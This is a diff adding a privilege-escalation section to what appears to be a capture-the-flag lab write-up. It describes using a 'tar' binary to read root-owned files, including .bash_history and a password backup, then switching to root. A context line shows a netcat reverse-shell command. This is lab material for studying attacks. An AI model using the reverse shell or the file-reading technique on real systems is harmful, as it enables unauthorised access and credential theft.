@@ -93,3 +93,26 @@ spawned a reverse shell using `/bin/nc -e /bin/bash $IP $port`
 ## Privilege Escalation
 
 
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/fdd897c7-bfda-4772-8c2d-26b446b6a0cf)
+
+In the home directory of user `cyber` we can see a binary `tar`. 🤔 it is not an suid, let's see what we can do with this. 
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/c77c0f4d-0e6c-4f0b-99e7-0c22aced217b)
+
+checking gtfobins, we can see that we can read files. 🤔 hmmmmmm
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/ccd8a067-5d82-47f7-9c43-bd8059e3232c)
+
+we could read root files without being root using this binary. 🤔 let's try read root `.bash_history` file and see if we can loot anything.
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/5ee559d4-51e9-436a-b0ab-38e8dfe14f58)
+
+There's a file named `.old_pass.bak` and it is only owned by root, let's check it content since we can read root files. 
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/fbcd7429-d44c-4012-8f79-85369b77b8ac)
+
+checking the content of the file, we got a password, su root using the password and boom we are root.
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/e4cfbb94-e5af-4214-9f32-26314636866d)
+
+We broke out of the shell 😜 Interesting yeah? 
